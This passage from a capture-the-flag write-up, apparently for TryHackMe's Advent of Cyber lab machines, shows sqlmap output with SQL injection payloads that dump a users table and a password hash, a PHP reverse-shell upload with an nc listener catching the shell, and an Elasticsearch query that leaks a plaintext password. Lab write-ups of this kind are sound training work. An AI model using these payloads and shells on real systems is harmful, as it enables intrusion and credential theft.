  [01:12:57] [INFO] resuming back-end DBMS 'mysql' 
  [01:12:57] [INFO] testing connection to the target URL
  you have not declared cookie(s), while server wants to set its own ('PHPSESSID=mbi8fttdaal...avmf3r3531'). Do you want to use those [Y/n] y
  sqlmap resumed the following injection point(s) from stored session:
  ---
  Parameter: log_email (POST)
      Type: time-based blind
      Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
      Payload: log_email=hola' AND (SELECT 4129 FROM (SELECT(SLEEP(5)))IkBb) AND 'XRpP'='XRpP&log_password=123&login_button=Login
  
      Type: UNION query
      Title: Generic UNION query (NULL) - 12 columns
      Payload: log_email=hola' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a706a71,0x4b466a5266706b587069506a556c6e4b784d6b62456c684f77584177774f504679676d4c55446359,0x7162717a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&log_password=123&login_button=Login
  ---
  [01:12:58] [INFO] the back-end DBMS is MySQL
  back-end DBMS: MySQL >= 5.0.12
  [01:12:58] [INFO] fetching tables for database: 'social'
  [01:12:58] [INFO] resumed: 'comments'
  [01:12:58] [INFO] resumed: 'friend_requests'
  [01:12:58] [INFO] resumed: 'likes'
  [01:12:58] [INFO] resumed: 'messages'
  [01:12:58] [INFO] resumed: 'notifications'
  [01:12:58] [INFO] resumed: 'posts'
  [01:12:58] [INFO] resumed: 'trends'
  [01:12:58] [INFO] resumed: 'users'
  Database: social                                                                                                                                                                  
  [8 tables]
  +-----------------+
  | comments        |
  | friend_requests |
  | likes           |
  | messages        |
  | notifications   |
  | posts           |
  | trends          |
  | users           |
  +-----------------+
  [01:13:36] [WARNING] Ctrl+C detected in dumping phase                                                                                                                             
  Database: social
  Table: users
  [1 entry]
  +--------------------+
  | email              |
  +--------------------+
  | bigman@shefesh.com |
  +--------------------+
  
  [*] ending @ 01:13:36 /2020-10-01/
  ~~~

  bigman@shefesh.com

- What is Santa Claus' plaintext password?

  **Solution:**

  ~~~bash
  $ python3 sqlmap.py -u http://10.10.29.192/register.php --data="log_email=hey&log_password=123&login_button=Login" --tables -D social -T users -C id,password,email,username --sql-query "select id,password,email,username from users where username like '%santa%'"
          ___
         __H__
   ___ ___["]_____ ___ ___  {1.4.9.23#dev}
  |_ -| . [(]     | .'| . |
  |___|_  [,]_|_|_|__,|  _|
        |_|V...       |_|   http://sqlmap.org
  
  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
  
  [*] starting @ 01:42:14 /2020-10-01/
  
  [01:42:14] [INFO] resuming back-end DBMS 'mysql' 
  [01:42:14] [INFO] testing connection to the target URL
  you have not declared cookie(s), while server wants to set its own ('PHPSESSID=j310t68mqqr...37sav0jie1'). Do you want to use those [Y/n] y
  sqlmap resumed the following injection point(s) from stored session:
  ---
  Parameter: log_email (POST)
      Type: time-based blind
      Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
      Payload: log_email=hola' AND (SELECT 4129 FROM (SELECT(SLEEP(5)))IkBb) AND 'XRpP'='XRpP&log_password=123&login_button=Login
  
      Type: UNION query
      Title: Generic UNION query (NULL) - 12 columns
      Payload: log_email=hola' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a706a71,0x4b466a5266706b587069506a556c6e4b784d6b62456c684f77584177774f504679676d4c55446359,0x7162717a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&log_password=123&login_button=Login
  ---
  [01:42:16] [INFO] the back-end DBMS is MySQL
  back-end DBMS: MySQL >= 5.0.12
  [01:42:16] [INFO] fetching tables for database: 'social'
  [01:42:16] [INFO] resumed: 'comments'
  [01:42:16] [INFO] resumed: 'friend_requests'
  [01:42:16] [INFO] resumed: 'likes'
  [01:42:16] [INFO] resumed: 'messages'
  [01:42:16] [INFO] resumed: 'notifications'
  [01:42:16] [INFO] resumed: 'posts'
  [01:42:16] [INFO] resumed: 'trends'
  [01:42:16] [INFO] resumed: 'users'
  Database: social                                                                                                                                                                  
  [8 tables]
  +-----------------+
  | comments        |
  | friend_requests |
  | likes           |
  | messages        |
  | notifications   |
  | posts           |
  | trends          |
  | users           |
  +-----------------+
  
  [01:42:16] [INFO] fetching SQL SELECT statement query output: 'select id,password,email,username from users where username like '%santa%''
  got a 302 redirect to 'http://10.10.29.192:80/index.php'. Do you want to follow? [Y/n] n
  [01:42:20] [WARNING] the SQL query provided does not return any output
  [01:42:20] [INFO] the SQL query provided has more than one field. sqlmap will now unpack it into distinct queries to be able to retrieve the output even if we are going blind
  [01:42:20] [WARNING] time-based comparison requires larger statistical model, please wait............................. (done)                                                     
  [01:42:22] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
  [01:42:22] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
  1
  [01:42:27] [INFO] retrieved: 1
  [01:42:38] [INFO] retrieved: f1267830a78c0b59acc06b05694b2e28
  [01:52:31] [INFO] retrieved: bigman@shefesh.com
  [01:57:20] [INFO] retrieved: santa_claus
  select id,password,email,username from users where username like '%santa%' [1]:
  [*] 1, f1267830a78c0b59acc06b05694b2e28, bigman@shefesh.com, santa_claus
  
  [*] ending @ 02:00:15 /2020-10-01/
  ~~~

  <img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_28_%234.png"/>

  saltnpepper

- Santa has a secret! Which station is he meeting Mrs Mistletoe in?

  **Solution:**

  <img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_28_%235.png"/>

  Waterloo

- Once you're logged in to LapLANd, there's a way you can gain a shell on the machine! Find a way to do so and read the file in /home/user/

  **Solution:**

  *Use php-reverse-shell.php from:*

  *<https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>*

  <img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_28_%236.png" style="zoom:150%;" />

  ~~~bash
  $ mv reverse-shell.php shell.phtml
  ~~~

  <img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_28_%237.png" style="zoom:150%;" />

  ~~~bash
  $ nc -nlvp 9999
  listening on [any] 9999 ...
  connect to [10.9.90.233] from (UNKNOWN) [10.10.149.88] 39568
  Linux server 4.15.0-72-generic #81-Ubuntu SMP Tue Nov 26 12:20:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
   00:17:50 up 4 min,  0 users,  load average: 1.66, 2.27, 1.11
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /bin/sh: 0: can't access tty; job control turned off
  $ ls
  bin
  boot
  cdrom
  dev
  etc
  home
  initrd.img
  initrd.img.old
  lib
  lib64
  lost+found
  media
  mnt
  opt
  proc
  root
  run
  sbin
  snap
  srv
  swap.img
  sys
  tmp
  usr
  var
  vmlinuz
  vmlinuz.old
  $ cd /home/suer
  /bin/sh: 2: cd: can't cd to /home/suer
  $ cd /home/user
  $ ls
  flag.txt
  $ cat flag.txt
  @@@########################################################################@@@@
  @@@(((((((((((((((((((((((((((((((((((%#(((((((((((((((((((((((((((((((((((@@@@
  @@@(((((((((((((((((((((((((((((((((%%,*%%(((((((((((((((((((((((((((((((((@@@@
  @@@((((((((((((((((((&%(((((((((((%#*/##(((((((((((#@%%((((((((((((((((((@@@@
  @@@(((((((((((((((((((%(//%((((((#(//,*%%((((((#/,(#(((((((((((((((((((@@@@
  @@@((((((((((((((((((((#(*%#/##,*#&%%%&%%,*%###%%/*&(((((((((((((((((((((@@@@
  @@@(((((((((((((((((((((#(&@(*(#(##%&%#%%%%#((%,*%&((((((((((((((((((((((((@@@@
  @@@(((((((((((((((((((((((@%%((#(**/*#,*(*//*/(((%%@(((((((((((((((((((((((@@@@
  @@@(((((((((((((((((((((((%%#(##,#**,##%#,*(#*#((%%#(((((((((((((((((((((((@@@@
  @@@(((((((((((((((((((((((#/#*(,*/((((((((((/****%*%(((((((((((((((((((((((@@@@
  @@@(((((((((((((((((((((((#(&/,,,,,,,,,,,,,,/%&&/#(((((((((((((((((((((((@@@@
  @@@((((((((((((((((((((((((#&((##(/********/(#(((&%((((((((((((((((((((((((@@@@
  @@@((((((((((((((((((((((((((((((((########((((((((((((((((((((((((((((((((@@@@
  @@@(((((((((((((((((((((((((((((((((#((((((((((((((((((((((((((((((((((((((@@@@
  @@@(((((((((((((((((((((((((%/((,     .      *##/%(((((((((((((((((((((((((@@@@
  @@@((((((((%((((((%((((((%###  .      .       .  %%(%((((((%((((((&((((((((@@@@
  @@@((((((%/,##((%/ #(((((%###  .   .  .       .. %%#%(((((&.(&((%( (#((((((@@@@
  @@@(((((#*,(%*%,%%/ (##((%###  .  .   .        * %%#%(((%# (%###(%( #((((((@@@@
  @@@((#%%.*#%,*#,/((# %(#%%### /*,./..*..,/ , ,*/ %%#%#%(/ (%,%/,%.(#,*##%((@@@@
  @@@(((# #(#,/(*(#./## /((%### /*/%&&,(..,/#,%.(  %%#%(#./%#,/%.(%,(##* #(((@@@@
  @@%#((#(/##%/%%(#%#%(%###.**.,*,.*.,,. **.*  %%#%(%#%#/%&*%%*&%((#((##@@@
  @@&%(((#,##(*#%/%(,## #((%###  .(     .    ,. .  %%#%((#.#((,%(*%(,##.((((#&@@@
  @@@@((((# %#,/#,#/(#(((((%###  .      .       .  %%#%(((((,#*#*#/,(% #((((&@@@@
  @@@&((((((%#&,#(/%(((((%###..,/#####&%#####*. .%%#%(((((##&*##.%##((((((@@@@@
  @@@@&((((((##(((#%(((((((%#(####//(##%@&%###((####(#%((((((###((###((((((%#@@@@
  @@@@@((((((((((((((((((((#%%%%%%%%%%%%%#%%%%%%%%%%%%%((((((((((((((((((((@,@@@@
  @@@@&@(((((((((((((((((((((((((((((((##%(#((((((((((((((((((((((((((((((#.@@@@@
  @@@@@ #((((((((((((((((((((((((((((%/%&&%%##((((((((((((((((((((((((((((@@@@@@@
  @@@@@@@#(((((((((((((((((((((((((%.( /%@,( (/#(((((((((((((((((((((((((@@@@@@@@
  @@@@@@@&((((((((((((((((((((((%#.(   /&%*/   (.(%(((((((((((((((((((((@%@@@@@@@
  @@@@@@@@%%((((((((((((((((#&(#.* . ** /@./,,.. / &(%((((((((((((((((#@,@@@@@@@@
  @@@@@@@@@.&(((((((((((((((&@@&%, /#,  /%, .#&@@@%%#((((((((((((((%#@@@@@@@@@@
  @@@@@@@@@@%@((((((((((((((#&..,,%&@. #//(( /@@#., ,(((((((((((((@%@@@@@@@@@@@
  @@@@@@@@@@@@@&(((((((((((((#,(  ,,,,#(/(#&@(,,.  /#(((((((((((((&%@@@@@@@@@@@@@
  %%#%&%@@@@@@@@&%((((((((((((#,(   *,  ,&.   ,., /#((((((((((((%@#@@@@@@@@&&%%%&
  /***/*%@@@@@@@@*&&(((((((((((%*  .#%@  ((*%&*, .,#((((((((((&@@@@@@@@@&***,**
  @#(,(%#@@@@@@@@@@*%@(((((((((#./,@&@. *,*.*@@#*,/(((((((((& @@@@@@@@@@@@@%#*((@
  &/#%//&@@@@@@@@@@@@@,&&(((((((%#&@((       .%@##&(((((#@(#@@@@@@@@@@@@@@@/%(((&
  #(/,,#&%@@@@@@@@@@@@@(%@(((((#%(%.,(#%#(,(%&(((#@.@@@@@@@@@@@@@@%%#,..(%*##
  &((&*%##*/.   ,*#%%#&%/&%@ /@((((((((((((((((#@@@@@@(&%&%%(/,.    ,/# %,@@/%%
   %/,(,,#,%@,.&*%(,%(//&%@@@@@@@@@%#((((#&@&@@@@@@@@.#%%*%.( &*@..@@*%%%#*%%
  @@#%*,*%*(& /( *&/%#&*,..@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,/#&(@. *(&(%./(*../@@@@
  @@@@@@@#,  . ,*,%.@*(##&%#&@@@@@@@@@@@@@@@@@@@@@@@@@#%%(((#,(&,/     ,#&%@@@@@@
  @@@@@@@@@@@@@@ #%@%%&(@/%**,,*(#%#@&&%%&&@#%##*,...*#/@/(#@%%, @@@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@@@@@@/*&,%,*#//%.**.(. ##..(%*(.,@,#@//#%@@@@@@@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@@@@@&%(@%#,##&**%(&/,@ @.@& &. */..@(*@%(#%@@@@@@@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@@@@@@@@%/**/,,#(%# %.& &,,,/,@#/%/,,,*(&%/@@@@@@@@@@@@@@@@@@@@@
  
  MERRY CHRISTMAS FROM SHEFFIELD, UK
  
  CREATED IN COLLABORATION WITH TRYHACKME.COM
  
  THM{SHELLS_IN_MY_EGGNOG}
  ~~~

  THM{SHELLS_IN_MY_EGGNOG}

---

###[Task 29]  [Day 24] Elf Stalk

- Find the password in the database

  **Solution:**

  ~~~bash
  $ nmap 10.10.6.152
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 00:33 CEST
  Nmap scan report for 10.10.6.152
  Host is up (0.043s latency).
  Not shown: 996 closed ports
  PORT     STATE SERVICE
  22/tcp   open  ssh
  111/tcp  open  rpcbind
  8000/tcp open  http-alt
  9200/tcp open  wap-wsp
  
  Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds
  
  $ wget http://10.10.6.152:8000/kibana-log.txt
  --2020-10-04 01:20:19--  http://10.10.6.152:8000/kibana-log.txt
  Connecting to 10.10.6.152:8000... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 560868 (548K) [text/plain]
  Saving to: ‘kibana-log.txt’
  
  kibana-log.txt             100%[========================================>] 547.72K   322KB/s    in 1.7s    
  
  2020-10-04 01:20:21 (322 KB/s) - ‘kibana-log.txt’ saved [560868/560868]
  $ cat kibana-log.txt | grep -e http://0.0.0.0:[0-9][0-9][0-9][0-9] -o | sort -u
  http://0.0.0.0:5601
  http://0.0.0.0:9200
  ~~~

  <img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_29_%231.png"/>

  ~~~bash
  $ curl -X GET "10.10.6.152:9200/_search?q=password&pretty"
  {
  "took" : 8,
    "timed_out" : false,
    "_shards" : {
      "total" : 6,
      "successful" : 6,
      "skipped" : 0,
      "failed" : 0
    },
    "hits" : {
      "total" : 1,
      "max_score" : 2.0136302,
      "hits" : [
        {
          "_index" : "messages",
          "_type" : "_doc",
          "_id" : "73",
          "_score" : 2.0136302,
          "_source" : {
            "sender" : "mary",
            "receiver" : "wendy",
            "message" : "hey, can you access my dev account for me. My username is l33tperson and my password is 9Qs58Ol3AXkMWLxiEyUyyf"
          }
        }
      ]
    }
  }
  ~~~

  9Qs58Ol3AXkMWLxiEyUyyf

- Read the contents of the /root.txt file

  **Solution:**

  someELKfun

---























